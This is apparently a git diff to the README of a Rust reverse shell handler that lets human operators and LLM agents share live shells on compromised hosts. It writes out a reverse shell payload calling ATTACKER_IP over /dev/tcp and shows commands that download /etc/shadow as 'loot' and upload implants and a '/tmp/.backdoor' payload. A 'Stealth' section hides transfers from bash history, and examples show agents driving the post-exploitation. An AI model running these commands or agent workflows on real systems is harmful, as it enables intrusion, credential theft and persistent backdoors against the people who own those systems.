@@ -1,20 +1,37 @@
 # shell-handler
 
-A reverse shell handler written in Rust. Designed for ergonomic human use and LLM/agent automation simultaneously — both share the same live shell session without conflict.
+A reverse shell handler written in Rust. Designed for ergonomic human use and LLM/agent automation simultaneously — both share the same live shell session without conflict. Start a listener in the background with `-d`, then attach interactively from any terminal — like `docker run -d` / `docker exec -it`.
 
 ---
 
 ## Quick start
 
 ```bash
-# Terminal 1: wait for an incoming reverse shell on port 4444
-shell-handler listen 4444
+# Background listener — terminal freed immediately
+shell-handler listen 4444 -d
+#   [*] session: a1b2c3d4
+#   [*] listening in background — attach with: shell-handler attach a1b2c3d4
 
-# On the target — any common payload:
+# On the target:
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
 
-# Terminal 2 (or LLM): inject commands into the live session
-shell-handler exec <session-id> whoami
+# Attach interactively from any terminal (raw PTY passthrough, vim/htop work):
+shell-handler attach a1b2c3d4
+
+# From another terminal (or LLM): inject commands into the live session
+shell-handler exec a1b2c3d4 whoami
+```
+
+### Interactive mode (no -d)
+
+```bash
+# Drop into the session directly — Terminal 1 becomes the interactive console
+shell-handler listen 4444
+
+# Leave without closing the connection (CTRL+Q → handler mode → detach):
+# The process auto-suspends; type 'bg' in your shell to resume in background.
+# Then reconnect from any terminal:
+shell-handler attach a1b2c3d4
 ```
 
 ---
@@ -36,12 +53,15 @@ shell-handler listen <PORT> [OPTIONS]
 | `-o, --obfuscation <LEVEL>` | `none` | Obfuscation level: `none` \| `light` \| `medium` \| `heavy` |
 | `-s, --shell <TYPE>` | `auto` | Shell type: `auto` \| `linux` \| `windows` |
 | `--session <ID>` | *(random 8-char)* | Pin a custom session ID instead of generating one |
+| `-d, --daemon` | off | Background the listener immediately; reconnect with `attach` (Unix only) |
 
 Examples:
 ```bash
 shell-handler listen 4444
+shell-handler listen 4444 -d                        # background immediately
 shell-handler listen 4444 -o light -s linux
 shell-handler listen 443 -l 10.0.0.5 --session mysession
+shell-handler listen 443 -d --session mysession     # pinned ID, daemonized
 ```
 
 The session ID is printed in the startup banner and used by all other subcommands.
@@ -209,11 +229,92 @@ Sends a kill signal over the IPC socket. The interactive session prints a notice
 
 ---
 
+### `attach`
+
+Re-attach an interactive terminal to a detached session.
+
+```
+shell-handler attach <SESSION-ID>
+```
+
+Example:
+```bash
+shell-handler attach a1b2c3d4
+# [+] attached to session a1b2c3d4  ·  CTRL+Q to detach
+```
+
+- Enters raw PTY passthrough mode immediately — all keystrokes forwarded byte-for-byte.
+- **CTRL+Q** / **CTRL+]** detach from the session and return you to your local shell. The session keeps running.
+- Terminal resize events are synced automatically via `stty cols W rows H`.
+- Only one interactive client at a time. A second `attach` while one is active is rejected (connection closes immediately).
+- Agent commands (`exec`) are blocked while an interactive client is attached; they return exit code 1 with an error message.
+
+See also: **detach** meta-command in handler mode below.
+
+---
+
+### `upload`
+
+Upload a local file to the remote system via a running session.
+
+```
+shell-handler upload <SESSION-ID> <LOCAL> [REMOTE]
+```
+
+| Argument | Default | Description |
+|---|---|---|
+| `SESSION-ID` | *(required)* | Target session ID |
+| `LOCAL` | *(required)* | Local file path to upload |
+| `REMOTE` | *(local filename in cwd)* | Remote destination path |
+
+Examples:
+```bash
+shell-handler upload a1b2c3d4 ./implant.elf /tmp/.x
+shell-handler upload a1b2c3d4 loot.txt              # → ./loot.txt on remote
+```
+
+Runs the full file transfer protocol (base64 heredoc + SHA256 verification) through the session's live TCP connection. Progress and result are shown in the interactive session terminal. The exit code is `0` on success, `1` on failure.
+
+---
+
+### `download`
+
+Download a file from the remote system via a running session.
+
+```
+shell-handler download <SESSION-ID> <REMOTE> [LOCAL]
+```
+
+| Argument | Default | Description |
+|---|---|---|
+| `SESSION-ID` | *(required)* | Target session ID |
+| `REMOTE` | *(required)* | Remote file path |
+| `LOCAL` | *(remote filename in cwd)* | Local destination path |
+
+Examples:
+```bash
+shell-handler download a1b2c3d4 /etc/passwd
+shell-handler download a1b2c3d4 /etc/shadow loot/shadow.txt
+```
+
+---
+
 ## Interactive shell
 
 When a reverse connection arrives, the handler automatically upgrades the remote to a PTY (via `python3 pty.spawn`, `python pty.spawn`, or `script`) and enters **raw PTY passthrough** mode. Every keystroke is forwarded byte-for-byte; all ANSI sequences, cursor movement, tab-completion, vim, htop, python3 REPL, and SSH all work out of the box.
 
-Press **CTRL+Q** at any time to drop to **handler mode** (a line-editor with history, meta-commands, and the LLM exec interface). Type `pty` or `upgrade` to return to raw PTY mode.
+Meta-commands (`upload`, `download`, `detach`, `help`, `clear`) are intercepted locally and work **directly in raw PTY mode** — just type them like any other command and press Enter. No mode switching required. Press **CTRL+Q** to drop into **handler mode** (line-editor with history) when you want it; type `pty` to return to raw PTY mode.
+
+### Prompt
+
+The interactive prompt shows the obfuscation level badge (evil-winrm style) and remote identity:
+
+```
+*SH[H]* www-data@victim »     ← heavy  (red)
+*SH[M]* user@target »         ← medium (yellow)
+*SH[L]* root@host »           ← light  (green)
+*SH* user@host »              ← none   (dim)
+```
 
 ### Identity probe
 
@@ -223,18 +324,62 @@ printf 'SHIDENTITY:%s:%s\n' "$(whoami)" "$(hostname -s)"
 ```
 and waits up to 2 seconds for the response. The resolved `user` and `host` are stored in the session metadata.
 
-### Handler mode (meta-commands)
+### Meta-commands
 
-Press **CTRL+Q** from raw PTY mode to enter handler mode. The following commands are interpreted locally — not sent to the remote.
+The following commands are interpreted locally — not sent to the remote shell. They work in both **raw PTY mode** (the default) and **handler mode** (CTRL+Q).
 
 | Command | Description |
 |---|---|
 | `help` | Show help |
 | `clear` | Clear the screen |
-| `download <remote> [local]` | Fetch a file from the target |
-| `upload <local> <remote>` | Push a file to the target |
-| `pty` | Return to raw PTY passthrough (no re-upgrade) |
-| `upgrade` | Re-send PTY upgrade payload, then return to raw PTY mode |
+| `download <remote> [local]` | Stream a file from the target; SHA256 verified |
+| `upload <local> <remote>` | Stream a file to the target; SHA256 verified |
+| `detach` | Release the local terminal while keeping the TCP connection alive |
+| `pty` | *(handler mode)* Switch to raw PTY passthrough |
+| `upgrade` | *(handler mode)* Re-send PTY upgrade payload, then switch to raw PTY mode |
+
+### Detach / attach workflow
+
+Two ways to leave a session without closing the TCP connection:
+
+**Recommended: start in daemon mode from the beginning**
+
+```bash
+# Listener runs in background — terminal freed immediately
+shell-handler listen 9001 -d
+# [*] session: a1b2c3d4
+# [*] listening in background — attach with: shell-handler attach a1b2c3d4
+
+# Attach from any terminal whenever you need interactive access
+shell-handler attach a1b2c3d4
+# [+] attached to session a1b2c3d4  ·  CTRL+Q to detach
+
+# Detach with CTRL+Q — session keeps running, terminal returned immediately
+# Re-attach any number of times from any terminal
+```
+
+**Fallback: `detach` meta-command from an interactive session**
+
+If you started without `-d` and want to leave:
+
+```bash
+# Type directly at the shell prompt (raw PTY or handler mode):
+detach
+# [*] session a1b2c3d4 detached
+#     ├ type 'bg' in your shell to resume in background
+#     └ shell-handler attach a1b2c3d4 to reconnect
+
+# The process auto-suspends (SIGTSTP) — your shell shows it stopped.
+# Type 'bg' once to resume it in the background:
+bg
+# Then from any terminal:
+shell-handler attach a1b2c3d4
+```
+
+While detached (either way):
+- The TCP connection stays alive — the remote shell keeps running.
+- `shell-handler exec` and `shell-handler ps/inspect` work normally.
+- Incoming TCP output is silently drained so the remote shell never stalls on a full buffer.
 
 ### Auto-upgrade on connect
 
@@ -263,7 +408,7 @@ print(os.getuid())
 
 #### Raw PTY mode (default)
 
-All keystrokes are forwarded byte-for-byte to the remote. The only locally-handled keys are:
+All keystrokes are forwarded byte-for-byte to the remote. Meta-commands (`upload`, `download`, `detach`, `help`, `clear`) are intercepted when typed as a complete line — the remote's input buffer is cleared with CTRL+U before executing locally. The only other locally-handled keys are:
 
 | Key | Action |
 |---|---|
@@ -286,6 +431,15 @@ All keystrokes are forwarded byte-for-byte to the remote. The only locally-handl
 | **CTRL+W** | Kill word backward |
 | **↑ / ↓** | History navigation (up to 1000 entries, no consecutive duplicates) |
 | **Alt+Enter** | Insert newline (multiline input) |
+
+#### Attach mode (`shell-handler attach`)
+
+All keystrokes are forwarded byte-for-byte, same as raw PTY mode. The only locally-handled keys are:
+
+| Key | Action |
+|---|---|
+| **CTRL+Q** | Detach from the session and return to your local shell |
+| **CTRL+]** | Detach (US keyboard variant) |
 
 ---
 
@@ -312,6 +466,7 @@ A human and an LLM can operate the same live shell at the same time.
 2. LLM commands arrive via a Unix socket (`/tmp/.shh-<id>.sock`) and are serialised through an internal channel — only one can run at a time.
 3. While an LLM command runs, the human sees `[agent running...]` and pressing **Enter** shows a "busy" hint instead of sending.
 4. **CTRL+C** in the interactive terminal cancels the running LLM command with exit code `130`.
+5. While an interactive client is attached via `shell-handler attach`, agent commands (`exec`) are blocked and immediately return exit code `1`. Detach the interactive client first to resume automated use.
 
 **Typical LLM workflow:**
 
@@ -333,6 +488,88 @@ shell-handler exec "$SESSION" --cmd "find /var/www -name '*.php' -mtime -1"
 # 5. Python one-liner (inner quotes use the remote shell's quoting rules)
 shell-handler exec "$SESSION" --cmd "python3 -c \"import os; print(os.getuid())\""
 ```
+
+---
+
+## File transfer
+
+### Two ways to transfer files
+
+**Interactive (in-session):** Type the command directly at the shell prompt — raw PTY mode or handler mode, no switching required. The command is intercepted locally and never reaches the remote shell's history.
+
+```
+download /etc/passwd
+download /etc/shadow loot/shadow.txt
+upload ./implant.elf /tmp/.x
+upload ./payload.sh            # remote path defaults to ./payload.sh
+```
+
+**From another terminal or script** (via session IPC):
+
+```bash
+shell-handler upload a1b2c3d4 ./implant.elf /tmp/.x
+shell-handler download a1b2c3d4 /etc/shadow loot/shadow.txt
+
+# Works in LLM/agent pipelines:
+shell-handler upload "$SESSION" ./agent_payload /tmp/.backdoor
+```
+
+Both forms run the same transfer protocol through the session's live TCP connection and return the same progress display and SHA256 result.
+
+### How it works
+
+**Download** — streams base64-encoded output between per-transfer nonce delimiters:
+```bash
+if test -r '/remote/path'; then
+  printf 'SHSTRT<nonce>\n'
+  python3 -c '...' 2>/dev/null || base64 -w0 ... || base64 ... || openssl base64 ...
+  printf 'SHEEND<nonce>\n'
+else
+  printf 'SHNF<nonce>\n'
+fi
+```
+Decoded via a carry-buffer state machine that handles TCP chunk boundaries — constant memory use at any file size. 30-second idle timeout. Uses `if/else/fi` to avoid `exit 1` that would terminate the remote shell on file-not-found.
+
+**Upload** — streams as 76-char base64 lines inside a heredoc:
+```bash
+stty -echo; cat > /tmp/.shh_<nonce> << '__SHUPEOF__'
+<base64 line 1>
+<base64 line 2>
+__SHUPEOF__
+python3 -c "import base64,sys;sys.stdout.buffer.write(base64.b64decode(sys.stdin.read()))" < /tmp/.shh_<nonce> > '/remote/path' \
+  || base64 -d /tmp/.shh_<nonce> > '/remote/path' \
+  || base64 -D /tmp/.shh_<nonce> > '/remote/path'
+```
+Heredoc bypasses ARG_MAX — no file-size ceiling. Decoder chain (python3 → GNU base64 -d → BSD base64 -D) maximises remote compatibility. Sending and echo-drain run concurrently to prevent TCP buffer deadlock on large files.
+
+**After every transfer**, the handler verifies integrity:
+```bash
+sha256sum '/remote/path' 2>/dev/null || shasum -a 256 '/remote/path' 2>/dev/null
+```
+The local hash is computed independently. A mismatch is shown as an error.
+
+```
+  [↓]  /etc/shadow  →  shadow.txt
+  [✓]  [↓]  1.2 KB  ·  sha256 ok
+
+  [↑]  implant.elf  →  /tmp/.x
+  [↑]  4.5 MB / 4.5 MB  100%
+  [✓]  [↑]  4.5 MB  ·  sha256 ok
+```
+
+### Stealth
+
+Transfer commands are never added to the remote bash history (`set +o history` / `HISTFILE` save-restore pattern). Remote echo is suppressed via `stty -echo` before any command text is sent — only the very first line (the disable-echo command itself) is visible on the remote terminal; everything after it arrives silently.
+
+### Requirements on the target
+
+| Tool | Used for |
+|---|---|
+| `base64` | encoding / decoding (standard on all POSIX systems) |
+| `sha256sum` OR `shasum -a 256` | integrity verification (GNU or BSD coreutils — optional) |
+| `stty` | suppress echo during transfer (standard on all POSIX systems) |
+
+If neither sha tool is available, transfer still completes — the hash check is skipped and `(no hash verification)` is shown.
 
 ---
 
@@ -359,7 +596,16 @@ server → client:   <output bytes>
                    \x00SHEX:<exit_code>\n    ← trailer (NUL byte prefix, never in real output)
 ```
 
-Special command: `__SHHANDLER_KILL__` causes the session to exit cleanly without running anything on the remote shell.
+Special commands (not run on the remote shell):
+
+| Command | Action |
+|---|---|
+| `__SHHANDLER_KILL__` | Terminate the session gracefully |
+| `__SHHANDLER_ATTACH__` | Upgrade to bidirectional byte relay (used by `attach`) |
+| `__SHHANDLER_UPLOAD__\x00<local>\x00<remote>` | Run file upload protocol; output = `"upload complete\n"` or error |
+| `__SHHANDLER_DOWNLOAD__\x00<remote>\x00<local>` | Run file download protocol; output = `"download complete\n"` or error |
+
+Upload/download IPC commands use NUL (`\x00`) as path separator (valid in a line-delimited protocol, never a line terminator).
 
 ---
 
